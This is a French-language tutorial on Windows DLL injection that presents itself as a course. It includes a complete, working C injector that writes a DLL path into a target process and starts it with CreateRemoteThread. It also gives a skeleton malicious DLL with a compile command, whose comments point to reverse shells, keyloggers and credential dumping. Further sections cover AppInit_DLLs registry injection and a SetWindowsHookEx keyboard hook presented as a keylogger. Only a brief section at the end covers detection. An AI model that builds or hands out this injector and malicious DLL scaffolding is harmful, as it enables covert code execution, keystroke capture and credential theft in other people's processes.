# Cours : DLL Injection - Injection de Bibliothèques Dynamiques

## 1. Introduction - Qu'est-ce qu'une DLL ?

### 1.1 DLL Expliquée Simplement

**DLL** = Dynamic Link Library (Bibliothèque à Liaison Dynamique)

**Analogie** : Une DLL est comme une **boîte à outils** que plusieurs programmes peuvent utiliser.

```ascii
SANS DLL (Code dupliqué) :

Programme A          Programme B          Programme C
┌──────────┐         ┌──────────┐         ┌──────────┐
│ Code     │         │ Code     │         │ Code     │
│ +        │         │ +        │         │ +        │
│ Fonction │         │ Fonction │         │ Fonction │
│ Printf() │         │ Printf() │         │ Printf() │
│ (copie)  │         │ (copie)  │         │ (copie)  │
└──────────┘         └──────────┘         └──────────┘
  Gaspillage !         Gaspillage !         Gaspillage !

AVEC DLL (Code partagé) :

Programme A          Programme B          Programme C
┌──────────┐         ┌──────────┐         ┌──────────┐
│ Code     │         │ Code     │         │ Code     │
└────┬─────┘         └────┬─────┘         └────┬─────┘
     │                    │                    │
     └────────────────────┼────────────────────┘
                          ↓
                  ┌──────────────┐
                  │  msvcrt.dll  │  ← Une seule copie !
                  │  Printf()    │     Partagée par tous
                  └──────────────┘
```

**Avantages** :
- ✅ Économise la mémoire (une seule copie)
- ✅ Mise à jour facile (update la DLL, tous les programmes bénéficient)
- ✅ Modularité (fonctionnalités séparées)

**Sur Windows** : Presque tout est en DLL
- `kernel32.dll` : Fonctions système de base
- `user32.dll` : Interface utilisateur
- `ws2_32.dll` : Sockets réseau
- `ntdll.dll` : Appels système natifs

### 1.2 Comment une DLL est Chargée ?

```ascii
CHARGEMENT NORMAL (au démarrage) :

Programme lance :
   ↓
Windows lit le PE Header
   ↓
Trouve section "Import Table"
   ├─ kernel32.dll
   ├─ user32.dll
   └─ ws2_32.dll
   ↓
Loader Windows (ntdll!LdrLoadDll) :
   ├─ Cherche les DLL
   ├─ Les mappe en mémoire
   └─ Résout les adresses de fonctions
   ↓
Programme prêt à utiliser les fonctions DLL
```

## 2. DLL Injection - Le Concept

### 2.1 Forcer le Chargement d'une DLL

**DLL Injection** = Forcer un processus à charger **notre DLL malveillante**.

```ascii
PROCESSUS CIBLE (notepad.exe) :

AVANT Injection :
┌──────────────────────────────────┐
│  notepad.exe                     │
├──────────────────────────────────┤
│  DLLs chargées :                 │
│  ├─ kernel32.dll                 │
│  ├─ user32.dll                   │
│  └─ ntdll.dll                    │
└──────────────────────────────────┘

APRÈS Injection :
┌──────────────────────────────────┐
│  notepad.exe                     │
├──────────────────────────────────┤
│  DLLs chargées :                 │
│  ├─ kernel32.dll                 │
│  ├─ user32.dll                   │
│  ├─ ntdll.dll                    │
│  └─ malicious.dll  ← INJECTÉE !  │
│     (notre code)                 │
└──────────────────────────────────┘
```

**Que fait notre DLL ?**

Quand une DLL est chargée, Windows appelle automatiquement sa fonction **DllMain()** :

```c
// malicious.dll
BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        // ✅ Code exécuté automatiquement au chargement
        MessageBox(NULL, "DLL Injectée !", "Pwned", MB_OK);
        // Ici : reverse shell, keylogger, etc.
    }
    return TRUE;
}
```

## 3. Technique #1 : LoadLibrary Injection

### 3.1 L'Algorithme Complet

```ascii
╔═══════════════════════════════════════════════════════╗
║  DLL INJECTION VIA LOADLIBRARY - 6 ÉTAPES             ║
╚═══════════════════════════════════════════════════════╝

ÉTAPE 1 : Trouver l'adresse de LoadLibraryA
├─ LoadLibraryA est dans kernel32.dll
├─ kernel32 est chargé à la MÊME adresse dans TOUS les processus
└─ GetProcAddress(kernel32, "LoadLibraryA")

        ↓

ÉTAPE 2 : Ouvrir le processus cible
└─ OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid)

        ↓

ÉTAPE 3 : Allouer mémoire pour le chemin de la DLL
└─ VirtualAllocEx(..., strlen(dllPath), ...)

        ↓

ÉTAPE 4 : Écrire le chemin "C:\malicious.dll"
└─ WriteProcessMemory(..., "C:\\evil.dll", ...)

        ↓

ÉTAPE 5 : Créer thread avec LoadLibraryA comme fonction
└─ CreateRemoteThread(..., LoadLibraryA, dllPathAddr, ...)

        ↓

ÉTAPE 6 : LoadLibraryA s'exécute dans le processus cible
├─ Charge notre DLL
├─ Appelle DllMain(DLL_PROCESS_ATTACH)
└─ Notre code s'exécute ! 🎯
```

### 3.2 Visualisation Détaillée

```ascii
NOTRE PROCESSUS (injector.exe) :

┌──────────────────────────────────────┐
│  kernel32.dll mappé à 0x76540000     │  ← Même adresse
│  ├─ LoadLibraryA : 0x76541234       │     partout !
│  └─ ...                              │
└──────────────────────────────────────┘

PROCESSUS CIBLE (notepad.exe) AVANT :

┌──────────────────────────────────────┐
│  kernel32.dll mappé à 0x76540000     │  ← Même adresse
│  ├─ LoadLibraryA : 0x76541234       │     (ASLR désactivé
│  └─ ...                              │      pour kernel32)
│                                      │
│  Mémoire libre...                    │
└──────────────────────────────────────┘

ÉTAPE : WriteProcessMemory(chemin DLL)

┌──────────────────────────────────────┐
│  0x00A00000:                         │
│  "C:\temp\evil.dll\0"  ← Chemin écrit│
└──────────────────────────────────────┘

ÉTAPE : CreateRemoteThread(LoadLibraryA, 0x00A00000)

Thread créé dans notepad.exe :
┌──────────────────────────────────────┐
│  Thread exécute :                    │
│  LoadLibraryA("C:\\temp\\evil.dll")  │
│       ↓                               │
│  Windows charge la DLL               │
│       ↓                               │
│  DllMain() appelé automatiquement    │
│       ↓                               │
│  Notre code s'exécute !              │
└──────────────────────────────────────┘
```

### 3.3 Code Complet LoadLibrary Injection

```c
#include <windows.h>
#include <stdio.h>

int main(int argc, char **argv) {
    if (argc != 3) {
        printf("Usage: %s <PID> <DLL_Path>\n", argv[0]);
        return 1;
    }
    
    DWORD targetPID = atoi(argv[1]);
    char *dllPath = argv[2];  // Ex: "C:\\temp\\evil.dll"
    
    printf("[+] Cible : PID %lu\n", targetPID);
    printf("[+] DLL : %s\n", dllPath);
    
    // ═══════════════════════════════════════════
    // ÉTAPE 1 : Trouver LoadLibraryA
    // ═══════════════════════════════════════════
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    LPVOID pLoadLibrary = (LPVOID)GetProcAddress(hKernel32, "LoadLibraryA");
    
    printf("[+] kernel32.dll : 0x%p\n", hKernel32);
    printf("[+] LoadLibraryA : 0x%p\n", pLoadLibrary);
    
    // ═══════════════════════════════════════════
    // ÉTAPE 2 : Ouvrir processus
    // ═══════════════════════════════════════════
    HANDLE hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
        FALSE,
        targetPID
    );
    
    if (hProcess == NULL) {
        printf("[-] OpenProcess failed: %lu\n", GetLastError());
        return 1;
    }
    
    // ═══════════════════════════════════════════
    // ÉTAPE 3 : Allouer pour le chemin DLL
    // ═══════════════════════════════════════════
    size_t dllPathLen = strlen(dllPath) + 1;
    LPVOID pRemotePath = VirtualAllocEx(
        hProcess,
        NULL,
        dllPathLen,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE  // RW suffitpour une string
    );
    
    if (pRemotePath == NULL) {
        printf("[-] VirtualAllocEx failed: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }
    
    printf("[+] Chemin alloué à : 0x%p\n", pRemotePath);
    
    // ═══════════════════════════════════════════
    // ÉTAPE 4 : Écrire le chemin
    // ═══════════════════════════════════════════
    if (!WriteProcessMemory(hProcess, pRemotePath, dllPath, dllPathLen, NULL)) {
        printf("[-] WriteProcessMemory failed: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    
    printf("[+] Chemin écrit : %s\n", dllPath);
    
    // ═══════════════════════════════════════════
    // ÉTAPE 5 : Créer thread avec LoadLibraryA
    // ═══════════════════════════════════════════
    HANDLE hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)pLoadLibrary,  // LoadLibraryA
        pRemotePath,                            // Paramètre = chemin DLL
        0,
        NULL
    );
    
    if (hThread == NULL) {
        printf("[-] CreateRemoteThread failed: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    
    printf("[+] Thread créé, DLL en cours de chargement...\n");
    
    // Attendre que LoadLibraryA termine
    WaitForSingleObject(hThread, INFINITE);
    
    printf("[+] Injection réussie !\n");
    printf("[+] La DLL est maintenant chargée dans le processus cible\n");
    
    // Nettoyer
    VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    
    return 0;
}
```

## 4. Création d'une DLL Malveillante

### 4.1 Squelette de DLL

```c
// evil.dll
#include <windows.h>
#include <stdio.h>

// Cette fonction est appelée automatiquement
BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    switch (reason) {
        case DLL_PROCESS_ATTACH:
            // ✅ Appelé quand la DLL est chargée
            MessageBox(NULL, "DLL Chargée !", "Injection", MB_OK);
            
            // Ici : Lancer reverse shell, keylogger, etc.
            CreateThread(NULL, 0, MaliciousThread, NULL, 0, NULL);
            break;
            
        case DLL_THREAD_ATTACH:
            // Appelé quand un nouveau thread est créé
            break;
            
        case DLL_THREAD_DETACH:
            // Appelé quand un thread se termine
            break;
            
        case DLL_PROCESS_DETACH:
            // Appelé quand la DLL est déchargée
            break;
    }
    return TRUE;
}

DWORD WINAPI MaliciousThread(LPVOID param) {
    // Votre payload ici
    // Ex: reverse shell, credential dumping, etc.
    
    while (1) {
        // Keylogger, capture d'écran, etc.
        Sleep(1000);
    }
    
    return 0;
}
```

**Compilation** :
```bash
gcc -shared -o evil.dll evil.c -lws2_32
```

## 5. Autres Techniques d'Injection DLL

### 5.1 AppInit_DLLs (Registry)

```ascii
REGISTRY :
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows
├─ AppInit_DLLs = "C:\\evil.dll"
└─ LoadAppInit_DLLs = 1

RÉSULTAT :
Toute application qui charge user32.dll
chargera automatiquement evil.dll

┌──────────────────────────────────────┐
│  CHAQUE programme avec interface    │
│  graphique charge user32.dll        │
│       ↓                              │
│  Charge automatiquement evil.dll    │
│       ↓                              │
│  Injection GLOBALE ! 🎯             │
└──────────────────────────────────────┘

⚠️ Très détectable, nécessite droits admin
```

### 5.2 SetWindowsHookEx (Hooks)

```c
HHOOK hHook = SetWindowsHookEx(
    WH_KEYBOARD,      // Type : Hook clavier
    HookProc,         // Fonction dans notre DLL
    hDllModule,       // Handle de notre DLL
    0                 // Thread ID (0 = tous les threads)
);
```

```ascii
Windows injecte automatiquement notre DLL
dans TOUS les processus ayant une fenêtre !

Process 1 (explorer.exe)    │  Notre DLL
Process 2 (chrome.exe)      │    injectée
Process 3 (notepad.exe)     │   partout
Process 4 (calc.exe)        │

Quand l'utilisateur tape au clavier :
   ↓
Hook déclenché dans chaque processus
   ↓
Notre HookProc() appelée
   ↓
On peut capturer les touches ! (keylogger)
```

## 6. Détection et Protection

```ascii
INDICATEURS D'INJECTION DLL :

1. DLL suspectes chargées :
   ┌────────────────────────────────┐
   │ Process Explorer :             │
   │ notepad.exe                    │
   │  ├─ kernel32.dll   ✅          │
   │  ├─ user32.dll     ✅          │
   │  └─ evil.dll       ❌ Suspect  │
   └────────────────────────────────┘

2. Chemins anormaux :
   ├─ C:\Windows\System32\*.dll  ✅ Légitime
   ├─ C:\Program Files\App\*.dll  ✅ OK
   └─ C:\Temp\x.dll              ❌ Suspect

3. DLL non signées :
   └─ Vérifier signature numérique
```

## Ressources

- [DLL Injection](https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process)
- [LoadLibrary](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya)

